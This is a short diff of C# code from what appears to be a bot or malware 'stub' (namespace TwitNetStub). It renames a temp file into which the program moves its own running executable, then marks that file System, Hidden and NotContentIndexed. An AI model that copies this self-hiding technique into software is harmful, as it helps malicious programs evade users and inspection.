@@ -27,10 +27,10 @@ namespace TwitNetStub.Operations
             byte[] newfile = new byte[1];
             string filename = Constants.FileName;
 
-            if (File.Exists("temp.0"))
-                File.Delete("temp.0");
-            File.Move(Application.ExecutablePath, "temp.0");
-            File.SetAttributes("temp.0", FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
+            if (File.Exists("temp0.tmp"))
+                File.Delete("temp0.tmp");
+            File.Move(Application.ExecutablePath, "temp0.tmp");
+            File.SetAttributes("temp0.tmp", FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
 
             for (int i = 0; i < file.Length; i++)
             {
